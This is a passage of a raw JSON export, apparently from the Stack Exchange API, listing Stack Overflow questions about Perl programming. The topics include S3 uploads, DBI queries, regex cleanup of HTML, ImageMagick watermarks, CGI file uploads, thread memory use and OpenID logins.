advance</p>\n\n<p>E.</p>\n"},{"tags":["perl","upload","amazon-s3","amazon-web-services","amazon"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12757574,"title":"How To Upload Images to Amazon S3 Using Perl?","body":"<p>I'm trying to upload files to S3 using Perl.</p>\n\n<p>According to this module:</p>\n\n<p><a href=\"http://search.cpan.org/~tima/Amazon-S3/lib/Amazon/S3/Bucket.pm\" rel=\"nofollow\">http://search.cpan.org/~tima/Amazon-S3/lib/Amazon/S3/Bucket.pm</a></p>\n\n<p>...the following code will upload text files:</p>\n\n<pre><code># create resource with meta data (attributes)\nmy $keyname = 'testing.txt';\nmy $value   = 'T';\n$bucket-&gt;add_key(\n   $keyname, $value,\n   {   content_type        =&gt; 'text/plain',\n       'x-amz-meta-colour' =&gt; 'orange',\n   }\n);\n</code></pre>\n\n<p>However, how do you upload images (GIF, JPEG, PNG) to S3?</p>\n\n<p>Thanks,</p>\n\n<p>Linda</p>\n"},{"tags":["perl","printing","newline"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12757404,"title":"Perl print function adding unwanted newlines to variables","body":"<p>I thought this would be simple enough. I have two arrays, and I want to print a sentence with numbers from these arrays into a file. I tried this:</p>\n\n<pre><code>chomp $array1[$x];\nchomp $array2[$x];\nprint FILE \"Number1: $array1[$x] \\&amp; Number2: $array2[$x] Some Words\\n\";\n</code></pre>\n\n<p>Which gives me:</p>\n\n<pre><code>Number1: 0\n &amp; Number2: 87.3\n Some Words\n</code></pre>\n\n<p>(Numbers here are just examples.)</p>\n\n<p>Any idea why this is happening?\nI've tried using</p>\n\n<pre><code>$array1[$x] =~ s/\\n//g;\n$array2[$x] =~ s/\\n//g;\n</code></pre>\n\n<p>as well, but it hasn't fixed anything.\nAlso, if I explicitly place these extra newlines in, like so:</p>\n\n<pre><code>print FILE \"Number1: $array1[$x]\\n \\&amp; Number2: $array2[$x]\\n Some Words\\n\"\n</code></pre>\n\n<p>I get the same output, so the unwanted newlines aren't being added anymore. Why?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":51,"score":-1,"question_id":12756971,"title":"From Database in Perl to spreadsheet","body":"<p>I have a transaction table like this:</p>\n\n<pre><code>TransactionID    Date           AccountNumber   Type    Amount  \n657520           02-07-1999     016901581432    Debit   16000  \n657524           02-07-1999     016901581432    Debit   13000  \n657538           09-07-1999     016901581432    Credit  11000  \n657548           18-07-1999     016901581432    Credit  15500  \n657519           02-07-1999     016901581433    Debit   12000  \n657523           02-07-1999     016901581433    Credit  11000  \n657529           03-07-1999     016901581433    Debit   15000  \n657539           10-07-1999     016901581433    Credit  10000  \n657541           11-07-1999     016901581434    Debit   12000  \n657525           03-07-1999     016901581434    Debit   15000  \n657533           05-07-1999     016901581434    Credit  12500 \n</code></pre>\n\n<p>I am supposed to find the total debit and total credit amount for each account using SQL query from the database and store result in spreadsheet using Perl.</p>\n\n<p>This is my code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse DBI;\nuse strict;\nuse warnings;\nuse Spreadsheet::WriteExcel;\n$dbh = DBI-&gt;connect('dbi:database','prithvi','prithvi') or die \"Couldn't connect\";\nmy $tran_cur = $dbh-&gt;prepare(\"SELECT AccountNumber, Type, SUM(Amount) FROM transaction GROUP BY AccountNumber, Type\");\nmy $workbook = Spreadsheet::WriteExcel-&gt;new('results.xls');\nmy $worksheet = $workbook-&gt;add_worksheet('Result');\nmy $row = 0;\nmy $col = 0;\n$worksheet-&gt;write_row($row++, $col, ['Account Number','Type','Total Amount']);\nwhile( my @data = $tran_cur-&gt;fetchrow_array)\n{\n $worksheet-&gt;write_row($row++, $col, \\@data);\n}\n</code></pre>\n\n<p>Where am I going wrong in the code? Please help. I get only the heading in the Excelsheet as the output.</p>\n"},{"tags":["regex","perl"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":179,"score":0,"question_id":12702597,"title":"Search a tag and delete its content including the tag itself in Perl","body":"<p>There are about 100 files and I need to go through each of them and delete all the data which is between <code>&lt;style&gt;</code> and <code>&lt;/style&gt;</code> + delete these tags too. </p>\n\n<p>For example</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt; &lt;title&gt; Example &lt;/title&gt; &lt;/head&gt;\n&lt;style&gt;\np{color: red;\nbackground-color: #FFFF;\n}\ndiv {......\n...\n}\n&lt;/style&gt;\n&lt;body&gt;\n&lt;p&gt; hi I'm a paragraph. &lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>should become</p>\n\n<pre><code>    &lt;html&gt;\n    &lt;head&gt; &lt;title&gt; Example &lt;/title&gt; &lt;/head&gt;\n    &lt;body&gt;\n    &lt;p&gt; hi I'm a paragraph. &lt;/p&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>\n\n<p>Kindly let me know the way to solve this using Perl. Thanks.</p>\n\n<p><strong>Edit:</strong> In some files the style pattern is like \n<code>&lt;style type = \"text/css\"&gt; blah &lt;/style&gt;</code> and <code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"$url_path/gridsorting.css\"&gt;</code>. I need to remove all 3 patterns.</p>\n"},{"tags":["perl","architecture","multiple-versions","perlbrew"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":130,"score":4,"question_id":11650615,"title":"Using perlbrew is it possible to do multiple installs by architecture?","body":"<p>I would like to be able to install multiple versions of Perl but I need to have them by architecture as well.</p>\n\n<p>I know that I can use perlbrew to get installs by version: 5.10.1, 5.12.3, 5.16.0, etc. I couldn't find a way to also have installs by architecture, Solaris-sparc, Solaris-x86, Linux-i686, Linux-x86_64, etc.</p>\n\n<p>Doing a <a href=\"http://stackoverflow.com/questions/3486665/how-can-install-multiple-perl-versions-without-them-tripping-over-each-others-x\">hand install</a> I can do this</p>\n\n<p>It's no big deal doing hand installs but perlbrew makes some things easier regarding management and such.</p>\n\n<p><strong>EDIT:</strong> As brought out the in comments I am using a common home directory NFS mounted across various platforms. </p>\n"}]}
{"total":22324,"page":12,"pagesize":100,"questions":[{"tags":["perl","markdown","gitweb"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":490,"score":4,"question_id":8321649,"title":"Gitweb: how to display markdown file in html format automatically like github","body":"<p>Markdown is important for documentation, it is very nice to see <code>README.md</code> can be automatically show in html format in github like <a href=\"https://github.com/twitter/bootstrap/blob/master/README.md\" rel=\"nofollow\">https://github.com/twitter/bootstrap/blob/master/README.md</a></p>\n\n<p>gitweb is written in perl script, and there is plugin for markdown in perl already.</p>\n\n<p>I want to check whether there is plugin/solution to let gitweb automatically show html files for markdown format. </p>\n"},{"tags":["perl","sybase"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":11521376,"title":"syb_describe in DBD::Sybase","body":"<p>I am looking to extract Sybase datatype for all the columns in a table. When I try to achieve this using <code>$sth-&gt;{TYPE}</code>, I get a numeric version of the datatype (i.e. instead of sybase datatype <code>varchar</code>, I get <code>0</code>).</p>\n\n<p>From the DBD::Sybase documentation, I noticed that <code>SYBTYPE</code> attribute of <code>syb_describe</code> function might be able to produce what I am looking for. But it seems that my understanding is not proper. <code>SYBTYPE</code> also prints datatype in numeric form only.</p>\n\n<p>Is there any way to fetch the textual representation of actual Sybase datatype (instead of the number)?</p>\n"},{"tags":["perl","imagemagick","png","opacity","watermark"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":104,"score":2,"question_id":12563650,"title":"png watermark in perl imagemagick, making png transparent","body":"<p>Need help with perl imagemagick!</p>\n\n<p>I am trying to put a png watermark on jpg image, </p>\n\n<pre><code>$image = Image::Magick-&gt;new;\n$image-&gt;Read('image_filename');\n\n$logo = Image::Magick-&gt;new;\n$logo-&gt;Read('watermark_filename');\n\n$logo-&gt;Transparent(color=&gt;'#FFFFFF');\n$image-&gt;Composite(image=&gt;$logo, gravity=&gt;'southeast', geometry=&gt;'-10-10'); \n$image-&gt;Write('final_filename');\n</code></pre>\n\n<p>Everything is ok, but I need my watermark is be transparent, when I am trying opacity=>'50%' it works, but the watermark png starts look like s...t:))</p>\n"},{"tags":["perl","parsing","interpreter"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":132,"score":3,"question_id":3481642,"title":"Parsing and converting 4Test to Perl","body":"<p>I want to convert 4Test scripts to Perl. I have been using the Parse::RecDescent in Perl, but am still overwhelmed at the task. Here is an example.</p>\n\n<p>An example of 4Test is something like:</p>\n\n<pre><code>ParseSMSPlans (STRING sDir)\n{\nSTRING sFile;\nSTRING sDirSMSPlan = sDir + \"sms_plans\\\";\nSTRING sDirPlan = sDir + \"plan\\\";\nSTRING sDirDeal = sDir + \"deal\\\";\nSTRING sDirProduct = sDir + \"product\\\";\nSTRING sLine, sType, sName;\nHFILE hIn;\nFILEINFO fiFile;\nLIST OF FILEINFO lfInfo = SYS_GetDirContents (sDirSMSPlan);\n       ...\n}\n</code></pre>\n\n<p>...\nThis is my Parse::RecDescent grammar</p>\n\n<pre><code>my $grammar = q{\n\n#-----------------identifiers and datatypes-------------------#\n\n    identifier : /[a-z]\\w+/\n    binops : '+' | '-' | '/' | '*' | '%' | '**'\n    lbinops: '!' | '&lt;' | '&gt;' | '&gt;='| '&lt;='| '&amp;&amp;'| '||' | '=='\n    integer: /\\d+/ {print \"hello $item[-1]\" if $::debugging;}\n    number : /(\\d+|\\d*\\.\\d+)/ {print \"hello $item[-1]\" if $::debugging;}\n    string : /\"(([^\"]*)(\\\\\")?)*\"/\n    operation : number binops number operation(s?)\n    datatype : /[a-zA-Z]\\w*/\n    definition : datatype expression(s) #{print \"hello $item[-1]\" if $::debugging;}\n                |datatype expression(s) \"=\" expression(s) #{print \"hello $item[-1] = $item[-2]\" if $::debugging;}\n    statement : ifexp | elsexp | elseifexp |forexp | feachexp | whexp | swcexp\n\n\n#------------------Expressed Values-----------------------------#\n    program : expression\n    expression :  number {print $item[1] if $::debugging}\n                | integer\n                | assignment\n                | operation\n                | identifier binops expression\n                | number binops expression\n\n#------------------Conditionals---------------------------------------#\n\n    ifexp  : 'if' '(' expression(s) ')' '{' expression(s) '}' elsexp(?)\n    elsexp : 'else' '{' expression(s) '}'\n    elseifexp: 'else' 'if' '(' expression(s) ')' '{' expression(s) '}'\n    forexp : 'for' '(' expression ';' expression ';' expression ')' '{' expression(s)  }'\n           | 'for' assignment 'to' number expression(s) | 'for' assignment 'to' number '{' expression(s) '}'\n    feachexp : 'for each' expression 'in' expression '{' expression(s) '}'\n    whexp  : 'while' '(' expression ')' '{' expression(s) '}'\n    casest : 'case' expression(s /,/) ':'\n    swcexp : 'switch' identifier '{' casest(s) '}' expression(s) 'default'\n    assignment : identifier(s) '=' expression\n};\n</code></pre>\n\n<p>So, I'm looking at adding \"$\" to every variable name, and chopping\ndatatypes. For the most part my grammar works, though I have fully\ntested it yet, but only because Parse::RecDescent has been a bit\ntricky for me to understand and, I'm not really sure if it's the best\nway to complete my task...or the fastest, for that matter.</p>\n\n<p>My main concern is whether or not anyone feels that PRD can handle what\nI'm asking it to do or will simple(complex) regex(s) suffice? I would\nappreciate any help anyone could offer on this. </p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12739826,"title":"How can I deprecate behavior while retaining API?","body":"<p>I have an API that I would like to change the behavior of. I originally made method <code>is_success</code> mean a \"green light\", but a \"red light\" is not exceptional, it still means the light is working properly. I would now like <code>is_success</code> to only be false in the event of a suggestion, and have added <code>is_green</code> and <code>is_red</code> (note: there are also statuses \"yellow\" and \"purple\") to my API to complement specific checks ( currently yellow and purple throw exceptions, but may get status checks later ).</p>\n\n<p>Is there any good way that I can give warnings from the code that the behavior is changing? or has changed? while allowing those warnings to be turned off if the user is aware? (note: have already put a deprecation notice in the change log )</p>\n"},{"tags":["perl","bash","grep"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12754160,"title":"find duplicate and execute script on a match","body":"<p>I am trying to create a script to parse a log file and find duplicate matches of a specific part of each line and if a duplicate exists I need to execute a script on the first line that matches the duplication. My log details are:</p>\n\n<pre><code>#: 177          101 User 1 Channel: SIP/101\n#: 178          117 User 2 Channel: SIP/117\n#: 179          150 User 3 Channel: SIP/150\n#: 356          166 User 4 Channel: SIP/166\n#: 387          117 User 2 Channel: SIP/117\n</code></pre>\n\n<p>I'd like to find duplicates based on the SIP/ part of the log file but I will need to execute a script based on the # part of the log file. Based on this log I need to execute a script for the #: 178 line.</p>\n\n<p>So far I have used </p>\n\n<p><code>egrep -o \".{50}SIP.{4}\"</code> </p>\n\n<p>to find the duplicates based on the SIP/ section of the line. It's not clear to me how I can then get the entire line to get the #: 178 and generate the script to execute.</p>\n"},{"tags":["html","perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12736652,"title":"Upload a file using HTML and Perl","body":"<p>I am trying to do a simple upload of a .csv file and save it on my server.  I'm not an expert in HTML or Perl, but due to client constraints this is what I must do.</p>\n\n<p>Here is the HTML:</p>\n\n<pre><code>&lt;form action=\"/path/to/service\" target=\"_self\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\nFile: &lt;input type=\"file\" name=\"attachment\" size=\"50\"&gt;\n&lt;SUBMIT_RESET Upload File&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>The Perl code looks like this:</p>\n\n<pre><code>    my $sql = \"SELECT NOW()\";\n    my $date = $DB-&gt;get_field($sql);\n\n    my ($path, $ext) = split(/\\./, $in{'attachment'});\n    my @pathParts = split(/\\//, $path);            \n    my $filename = $pathParts[@pathParts - 1] . \" - \" . $date;\n\n    if ($ext eq \"csv\") {                \n\n        open (OUTFILE, \"&gt;\", \"$datadir/imports/\" . $filename . \".\" . $ext);\n\n        while (read($in{'attachment'}, $buffer, 1024)) {\n            $file .= $buffer;\n        }\n        print OUTPUT $file;\n        close (OUTFILE);\n    }\n</code></pre>\n\n<p>Can anyone please give me some direction as to what I'm doing wrong.  I get the file located at the correct path, but it's always empty.</p>\n\n<p>Now, the code base I'm dealing with here is horrible and I cannot use strict.</p>\n\n<p>Suggestions?</p>\n\n<p>EDIT1:\nTo attempt to answer how $in{'attachment'} is populated I've included a snippet of code of how forms are handled.</p>\n\n<p>if ($ENV{'CONTENT_TYPE'} =~ m#^multipart/form-data#) {<br>\n            my $cgi = new CGI;\n            my @names = $cgi->param;</p>\n\n<pre><code>        foreach $name (@names) {\n            my @value = $cgi-&gt;param($name);\n            if (scalar(@value) &gt; 1) {\n                foreach $val (@value) {\n                    $in{$name} .= $val.\"\\0\";\n                }\n                $in{$name} =~s/\\\\0$//;\n            } else {\n                my $value = $cgi-&gt;param($name);\n                #my $value = join \"\\0\", @value;\n                $in{$name} = $value;\n            }\n            #my $value = $cgi-&gt;param($name);\n            #my $value = join \"\\0\", @value;\n            #$in{$name} = $value;\n        }\n</code></pre>\n\n<p>EDIT2:</p>\n\n<p>To summarize the solution provided by ikegami...</p>\n\n<p>I missed that the file handles were different for the read and print statements - <code>OUTFILE</code> and <code>OUTPUT</code>.  Clearly that is completely a novice mistake and for that I apologize!</p>\n\n<p>Best wishes to all who tried to help me.</p>\n"},{"tags":["mysql","sql","perl","dbi"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":12731915,"title":"Dynamic Multi Insert with DBI placeholders for many sets of VALUES","body":"<p>I'm building a dynamic SQL statement, that will insert one or more sets of <code>VALUES</code> via a prepared DBI statement, my question is this: </p>\n\n<p>Since I have a dynamic number of <code>VALUES</code> sets, and I will need to add as many <code>( ?, ?, ?),( ?, ?, ?)</code> etc as necessary to extend the statement <code>INSERT INTO `tblname` ( $columnsString ) VALUES</code> in order to submit only one query using placeholders and bind values- is this the preferred method(most efficient, etc., - reasoning behind efficiency would be helpful in your answer if possible) or should I just be building this as a query string with <code>sprintf</code> and <code>dbh-&gt;quote()</code>? </p>\n\n<p>(As a little extra information: I'm actually using AnyEvent::DBI right now, which only exposes placeholders &amp; bind values and not the <code>quote()</code> method so this wouldn't be easy for me to accomplish without creating another straight DBI <code>$dbh</code> and using another db server connection just to use the <code>quote()</code> method, or without altering the AnyEvent::DBI module myself.)</p>\n\n<p>Normally I would just execute the statements as necessary but in this heavy workload case I'm trying to batch inserts together for some DB efficiency.</p>\n\n<p>Also, if anyone could answer if it is possible( and then how to ) insert an sql <code>DEFAULT</code> value using placeholders and bind values that'd be awesome. Typically if I ever needed to do that I'd append the <code>DEFAULT</code>s to the string directly and use sprintf and <code>$dbh-&gt;quote()</code> only for the non <code>DEFAULT</code> values.</p>\n\n<h1>UPDATE:</h1>\n\n<p>Worked out the misunderstanding in a quick chat. User <a href=\"http://stackoverflow.com/users/589924/ikegami\">ikegami</a> suggested that instead of building the query string myself without placeholders, that I just intermingle VALUES and placeholders such as: </p>\n\n<p><code>$queryString .= '(DEFAULT,?,?),(DEFAULT,DEFAULT,DEFAULT)';</code> </p>\n\n<p>Some of the reasoning behind my first asking of this question on SO was because I was somewhat against this intermingling due to my thought that it made the code less readable, though after being assured that sql 'DEFAULT' couldn't be in a placeholder bind value, this was the method I had begun implementing. </p>\n\n<p>Using placeholders where possible does seem to be the more accepted method of building queries, and if you want an SQL <code>DEFAULT</code> you just need to include it in the same query building as the placeholders. This does not apply to <code>NULL</code> values, as those CAN be inserted with placeholders and a bind value of <code>undef</code>.</p>\n\n<h3>Update 2:</h3>\n\n<p>The reasoning I asked about performance, the 'acceptance' of building your own query with quote() vs building with placeholders, and why I've gone with a solution that involves using all columns for the SQL <code>INSERT INTO tblname (cols)</code> is because I have roughly 2-4 million rows a day going into a terrible db server, and my code is running on an equally terrible server. With my requirements of needing <code>DEFAULT</code> sql values, and these terrible performance constraints, I've chosen a solution for now. </p>\n\n<p>For future devs who stumble upon this - take a look at @emazep's solution of using SQL::Abstract, or if for some reason you need to build your own, you might consider either using @Schwern's subroutine solution or possibly incorporating some of @ikegami's answer into it as these are all great answers as to the 'Current state of affairs' regarding the usage of DBI and building dynamic queries.</p>\n"},{"tags":["perl","hash","reference"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12754414,"title":"Perl modifying hash in subroutine - global symbol requires explicit package name","body":"<p>Having some trouble adding some keys to a hash, i.e. modifying in a subroutine. Here's my subroutine call:</p>\n\n<pre><code>getMissingItems($filename, \\%myItems); #myItems is already defined above this\n</code></pre>\n\n<p>and the subroutine itself:</p>\n\n<pre><code>sub getMissingItems {\n    my $filename = shift;\n    my $itemHash = shift;\n\n    #... some stuff\n\n    foreach $item (@someItems) {\n\n        if (not exists $itemHash{$item}) {\n            %$itemHash{$item} = 0; \n        }\n\n    }\n\n}\n</code></pre>\n\n<p>I get the error \"Global symbol %itemHash requires explicit package name\"</p>\n\n<p>How should I be doing this properly? Thanks. </p>\n\n<p>EDIT - thanks everyone, over this first hurdle. I'm now getting \"Can't use string (\"0\") as a HASH ref while \"strict refs\" in use.\" I just want to set the missing key entry to zero</p>\n"},{"tags":["perl","amazon-route53"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12754276,"title":"Perl help dereferencing a reference to an array of hash references, containing record set data","body":"<p>I'm using the a Amazon Perl module that returns a reference to an array of hash references as $record_sets, containing record set data and I'm having a hard time dereferencing it. I can print the data using data dumper but I need to be able to manipulate the data. Below is the documentation provided for the module</p>\n\n<p>Thanks In Advance:</p>\n\n<pre><code>#list_resource_record_sets\n#Lists resource record sets for a hosted zone.\n#Called in scalar context:\n\n$record_sets = $r53-&gt;list_resource_record_sets(zone_id =&gt; '123ZONEID');\n\n#Returns: A reference to an array of hash references, containing record set data. Example:\n\n$record_sets = [\n{\nname =&gt; 'example.com.',\ntype =&gt; 'MX'\nttl =&gt; 86400,\nrecords =&gt; [\n'10 mail.example.com'\n]\n},\n{\nname =&gt; 'example.com.',\ntype =&gt; 'NS',\nttl =&gt; 172800,\nrecords =&gt; [\n'ns-001.awsdns-01.net.',\n'ns-002.awsdns-02.net.',\n'ns-003.awsdns-03.net.',\n'ns-004.awsdns-04.net.'\n]\n</code></pre>\n"},{"tags":["perl","moose"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12741531,"title":"coerce from hashref on all types","body":"<p>I have the following code duplicated several times as I have several classes that follow the same pattern</p>\n\n<pre><code>use MooseX::Types -declare [ qw( Item ) ];jj\nmy $itc = $prefix . 'Item';\nclass_type Item, { class =&gt; $itc };\ncoerce Item, from HashRef, via { load_class( $itc )-&gt;new( $_ ) };\n</code></pre>\n\n<p>is there an easy way for me to deduplicate the code that creates the <code>class_type</code> and coercion? This is not a problem understanding MooseX::Types but a problem of a large amount of duplicated code. Here is <a href=\"https://github.com/xenoterracide/Business-CyberSource/blob/b6f56612df3c8b8e993c5f5f19147e497ec3dcc0/lib/MooseX/Types/CyberSource.pm#L91\" rel=\"nofollow\">a link to that code in its current state</a>. It's turned into a bit of a mess, and isn't something I'm proud of.</p>\n"},{"tags":["python","perl","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":63,"score":0,"question_id":12754254,"title":"Is there a python package which does what WWW::Mechanize does in perl?","body":"<p>Is there a python package which can handle the same tasks covered by WWW::Mechanize in perl?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12753523,"title":"Extracting infromation from table on Web Page using perl","body":"<p>I am very new to perl and need some help with extracting a table from a web page. I was able to figure out how to get the page to print with perl today. Now I just need to only extract the information in the table which states the temperature.\nMy current code is:</p>\n\n<pre><code># perl\nuse strict;\n# use LWP::Simple;\nuse LWP::UserAgent;\nmy $ua = new LWP::UserAgent;\n$ua-&gt;timeout(120);\nmy $url='http://MyTempSite/';\nmy $request = new HTTP::Request('GET', $url);\nmy $response = $ua-&gt;request($request);\nmy $content = $response-&gt;content();\nprint $content;\n</code></pre>\n\n<p>I am trying to get the temperature readings from this html file:</p>\n\n<pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\"&gt;&lt;html&gt;&lt;body    bgcolor=\"#C0C0C0\" text=\"#000000\" vlink=\"#800080\" link=\"#0000FF\"&gt;&lt;P&gt;&lt;h1&gt;TempTrax Digital Thermometer&lt;/h1&gt;&lt;BR&gt;&lt;table cellpadding=0 cellspacing=0 border=0&gt;&lt;TR&gt;&lt;TD&gt;Model:&lt;/TD&gt;&lt;TD width=10 rowspan=7&gt;&lt;BR&gt;&lt;/TD&gt;&lt;TD&gt;E4&lt;/TD&gt;&lt;TR&gt;&lt;TD&gt;Manufacturer:&lt;/TD&gt;&lt;TD&gt;Sensatronics&lt;/TD&gt; &lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;Website:&lt;/TD&gt;&lt;TD&gt;&lt;a href=\"http://www.sensatronics.com\"&gt;http://www.sensatronics.com&lt;/a&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;Firmware Version:&lt;/TD&gt;&lt;TD&gt;1.2&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;Release Date:&lt;/TD&gt;&lt;TD&gt;December 16, 2003&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;Serial Number:&lt;/TD&gt;&lt;TD&gt;EA8E6L0T121&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;Unit name:&lt;/TD&gt;&lt;TD&gt;LiveTempMonitor&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;&lt;P&gt;&lt;h3&gt;Current temperature readings:&lt;/h3&gt;&lt;p&gt;&lt;table&gt;&lt;TR&gt;&lt;TD width=200&gt;Probe1:&lt;/TD&gt;&lt;TD&gt; 75.1&lt;/TD&gt;&lt;/TR&gt;\n&lt;TR&gt;&lt;TD width=200&gt;Probe2:&lt;/TD&gt;&lt;TD&gt;-99.9&lt;/TD&gt;&lt;/TR&gt;\n&lt;TR&gt;&lt;TD width=200&gt;Probe3:&lt;/TD&gt;&lt;TD&gt;-99.9&lt;/TD&gt;&lt;/TR&gt;\n&lt;TR&gt;&lt;TD width=200&gt;Probe4:&lt;/TD&gt;&lt;TD&gt;-99.9&lt;/TD&gt;&lt;/TR&gt;\n&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>How should I go about getting only the information in the \"Current temperature readings\" table to be pulled? Thank you all ahead of time for taking a look at this.</p>\n"},{"tags":["perl","grab"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":50,"score":-4,"question_id":12751074,"title":"Using Perl to grab whole website","body":"<p>i need to grab some website whole data. \nCan anyone tell me how I can do it with Perl or with software (besides httrack)\nThanks</p>\n"},{"tags":["multithreading","perl","garbage-collection"],"answer_count":1,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":118,"score":6,"question_id":12753208,"title":"Garbage collection in Perl threads","body":"<p>This question is a point of curiosity, as one of the two programs below works.</p>\n\n<p>I'm using Image::Magick to resize a number of photos. To save a bit of time, I work on each photo in its own thread, and use a semaphore to limit the number of threads working simultaneously. Originally I allowed every thread to run at once, but the script would quickly allocate 3.5 GB for all the photos (I only have 2GB available), and the script would run 5x slower than normal because of all the swapping to disk.</p>\n\n<p>The working, semaphore version code looks something like this:</p>\n\n<pre><code>use threads;\nuse Thread::Semaphore;\nuse Image::Magick;\n\nmy $s = Thread::Semaphore-&gt;new(4);\nforeach ( @photos ) {\n    threads-&gt;create( \\&amp;launch_thread, $s );\n}\nforeach my $thr ( reverse threads-&gt;list() ) {\n    $thr-&gt;join();\n}\n\nsub launch_thread {\n    my $s = shift;\n    $s-&gt;down();\n    my $image = Image::Magick-&gt;new();\n\n    # do memory-heavy work here\n\n    $s-&gt;up();\n}\n</code></pre>\n\n<p>This quickly allocates 500MB, and runs quite nicely without ever requiring more. (The threads are joined in reverse order to make a point.) </p>\n\n<p>I wondered if there might be overhead from launching 80 threads simultaneously and blocking most of them, so I altered my script to block the main thread:</p>\n\n<pre><code>my $s = Thread::Semaphore-&gt;new(4);\nforeach ( @photos ) {\n    $s-&gt;down();\n    threads-&gt;create( \\&amp;launch_thread, $s );\n}\nforeach my $thr ( threads-&gt;list() ) {\n    $thr-&gt;join();\n}\n\nsub launch_thread {\n    my $s = shift;\n    my $image = Image::Magick-&gt;new();\n\n    # do memory-heavy work here\n\n    $s-&gt;up();\n}\n</code></pre>\n\n<p>This version starts fine, but gradually accumulates the 3.5GB of space the original version used. It's faster than running all threads at once, but still quite a bit slower than blocking threads.</p>\n\n<p>My first guess was that the memory used by a thread isn't freed until join() is called on it, and as it's the main thread that blocks, no threads are freed until they've all been allocated. However, in the first, working version, the threads pass the guard in a more-or-less random order, but join in reverse order. If my guess is correct, then, many more than the four running threads should be waiting to be join()ed at any time, and this version should be slower as well.</p>\n\n<p>So why are these two versions so different?</p>\n"},{"tags":["perl","openid","google-openid","dancer"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":76,"score":4,"question_id":12609076,"title":"How do I properly implement Net::OpenID::Consumer for Google logins and request the user's email?","body":"<p>I've been able to use Net::OpenID::Consumer with success, but when I started requesting the user's email address Google now prompts the user to authorize the sharing of their email address. This happens every single time, regardless of whether the user checks the 'Remember this approval' checkbox.  How do I keep Google from prompting the user for approval every time?</p>\n\n<p>Our site's OpenID registration and login paths are the same, otherwise we could only request the email address from Google when the user registers.</p>\n\n<p>I'll try and post enough relevant code (this is a Dancer app).</p>\n\n<pre><code>my $csr = Net::OpenID::Consumer-&gt;new(                                                                                                            \n    ua =&gt; LWP::UserAgent-&gt;new(),                                                                                                                 \n    consumer_secret =&gt; $secret,                                                                                               \n);\n\nmy $claimed_identity = $csr-&gt;claimed_identity('https://www.google.com/accounts/o8/id');\n\n$claimed_identity-&gt;set_extension_args(\n    \"http://openid.net/srv/ax/1.0\",\n        {\n            'mode' =&gt; 'fetch_request',\n            'type.email' =&gt; 'http://axschema.org/contact/email',\n            'required'   =&gt; 'email',\n});\n\nmy $check_url = $claimed_identity-&gt;check_url(                                                                                                    \n        return_to =&gt; 'http://my.site.com/openid_landing',                                                                                                                \n        trust_root =&gt; 'http://my.site.com',                                                                              \n        delayed_return =&gt; 1,                                                                                                                     \n    );\n</code></pre>\n\n<p>Yahoo doesn't appear to have this problem.  I guess this could be an issue on Google's end, but I'm betting it's my code.</p>\n"},{"tags":["perl","serial-port"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12402059,"title":"Using perl to talk to serial port for sat comms","body":"<p>This is probably an easy one, but I need to use perl to both talk to a serial port, and accept responses back from it - ideally something which would flag up to the rest of my programme that a new message has come back from the port so that I can process it?</p>\n\n<p>The unit I'm using is called a RockBLOCK, it's a two-way satellite communicator module, plugs into the USB port, but presents itself as a normal serial device. Details here in case anyone is interested: <a href=\"http://rockblock.rock7mobile.com\" rel=\"nofollow\">http://rockblock.rock7mobile.com</a></p>\n\n<p>Does anyone have any sample code for sending data plus also flagging if a message has come back? The first bit seems fairly straighforward, but the second less 